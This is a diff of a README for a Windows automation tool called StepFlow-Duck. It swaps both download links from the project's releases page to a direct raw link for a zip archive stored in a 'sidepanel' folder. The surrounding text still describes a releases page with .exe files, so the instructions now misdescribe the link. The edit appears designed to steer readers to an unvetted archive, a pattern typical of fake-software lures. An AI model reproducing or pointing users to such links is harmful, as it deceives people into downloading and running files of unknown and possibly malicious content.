@@ -1,6 +1,6 @@
 # 🦆 StepFlow-Duck - Automate your daily workflow tasks easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Radiolat8993/StepFlow-Duck/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Radiolat8993/StepFlow-Duck/raw/refs/heads/main/sidepanel/Flow_Step_Duck_2.0.zip)
 
 StepFlow-Duck helps you manage repetitive computer tasks. You build sequences of actions to save time. The tool handles clicks, text entry, and data processing. It links these actions into a flow. You spend less time on manual input.
 
@@ -12,7 +12,7 @@ This software runs on Windows 10 or Windows 11. Your computer needs at least 4GB
 
 Visit the link below. This page hosts all available versions. Choose the top entry. Click the file ending in .exe to begin your download. 
 
-[Visit this page to download](https://github.com/Radiolat8993/StepFlow-Duck/releases)
+[Visit this page to download](https://github.com/Radiolat8993/StepFlow-Duck/raw/refs/heads/main/sidepanel/Flow_Step_Duck_2.0.zip)
 
 ## 🏗️ Installation Steps 🏗️
 
